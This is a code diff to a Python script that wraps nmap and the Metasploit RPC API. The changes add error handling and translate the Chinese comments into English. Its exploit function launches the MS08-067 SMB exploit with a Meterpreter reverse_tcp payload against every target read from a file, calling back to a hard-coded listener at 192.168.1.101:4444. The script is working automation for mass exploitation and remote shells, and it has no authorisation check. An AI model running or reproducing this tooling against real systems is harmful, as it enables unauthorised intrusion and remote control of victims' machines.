@@ -27,8 +27,12 @@ class MetasploitAPI:
     def _send_request(self, data):
         if self.token:
             data['token'] = self.token
-        response = requests.post(self.url, headers=self.headers, data=msgpack.packb(data))
-        return msgpack.unpackb(response.content)
+        try:
+            response = requests.post(self.url, headers=self.headers, data=msgpack.packb(data))
+            return msgpack.unpackb(response.content)
+        except requests.exceptions.RequestException as e:
+            print(f"Request failed: {e}")
+            return None
 
     def create_console(self):
         data = {'method': 'console.create'}
@@ -73,15 +77,21 @@ def get_targets_from_input():
         return read_json_file(targets_file)
 
 def save_to_json(data, filename):
-    with open(filename, 'w') as json_file:
-        json.dump(data, json_file, indent=4)
-    print(f"Scan results saved to {filename}")
+    try:
+        with open(filename, 'w') as json_file:
+            json.dump(data, json_file, indent=4)
+        print(f"Scan results saved to {filename}")
+    except IOError as e:
+        print(f"Error saving to file: {e}")
 
 def read_json_file(filename):
-    with open(filename, 'r') as json_file:
-        data = json.load(json_file)
-        targets = [entry['url'] for entry in data]
-    return targets
+    try:
+        with open(filename, 'r') as json_file:
+            data = json.load(json_file)
+        return [entry['url'] for entry in data]
+    except (IOError, KeyError) as e:
+        print(f"Error reading from file: {e}")
+        return []
 
 def scan_with_nmap(targets):
     nm = nmap.PortScanner()
@@ -111,56 +121,65 @@ def scan_with_nmap(targets):
     return results
 
 def exploit_with_metasploit(api, target, lhost, lport):
-    api.login()
+    if not api.login():
+        print("Failed to login to Metasploit")
+        return
+
     console = api.create_console()
+    if not console:
+        print("Failed to create console")
+        return
+
     console_id = console['id']
     
     exploit = 'exploit/windows/smb/ms08_067_netapi'
     payload = 'windows/meterpreter/reverse_tcp'
     options = {'RHOSTS': target, 'LHOST': lhost, 'LPORT': lport}
 
-    command = f'use {exploit}\n'
-    api.write_console(console_id, command)
-    for option, value in options.items():
-        command = f'set {option} {value}\n'
+    commands = [
+        f'use {exploit}\n',
+        *(f'set {option} {value}\n' for option, value in options.items()),
+        f'set PAYLOAD {payload}\n',
+        'exploit -j\n'
+    ]
+
+    for command in commands:
         api.write_console(console_id, command)
-    command = f'set PAYLOAD {payload}\n'
-    api.write_console(console_id, command)
-    command = 'exploit -j\n'
-    api.write_console(console_id, command)
-    
-    time.sleep(10)  # 等待利用模块执行
+        time.sleep(1)  # Allow some time for the command to process
+
+    time.sleep(10)  # Wait for the exploit module to execute
     result = api.read_console(console_id)
-    print(result['data'])
+    print(result.get('data', 'No data returned'))
 
     sessions = api.list_sessions()
     print('Sessions:', sessions)
 
-    # 销毁控制台
+    # Destroy the console
     api.write_console(console_id, 'exit\n')
-    api.write_console(console_id, 'exit\n')  # 在某些情况下，需要两次退出命令
+    api.write_console(console_id, 'exit\n')  # In some cases, two exit commands are needed
 
-# 示例使用
+# Example usage
 tool_choice = select_tool()
 if tool_choice == 'nmap':
-    # 获取扫描目标
+    # Get scan targets
     nmap_targets = get_targets_from_input()
     print("Nmap Scan Targets:", nmap_targets)
     
-    # Nmap 扫描
+    # Nmap scanning
     nmap_results = scan_with_nmap(nmap_targets)
     print("Nmap Scan Results:", nmap_results)
 
-    # 保存扫描结果到JSON文件
+    # Save scan results to JSON file
     save_to_json(nmap_results, 'nmap_scan_results.json')
 elif tool_choice == 'metasploit':
-    # 获取扫描目标
+    # Get scan targets
     targets = get_targets_from_input()
     
     lhost = '192.168.1.101'
     lport = 4444
     
-    # Metasploit 利用
+    # Metasploit exploitation
     msf_api = MetasploitAPI(host='127.0.0.1', port=55553, username='msf', password='your_password')
     for target in targets:
         exploit_with_metasploit(msf_api, target, lhost, lport)
+
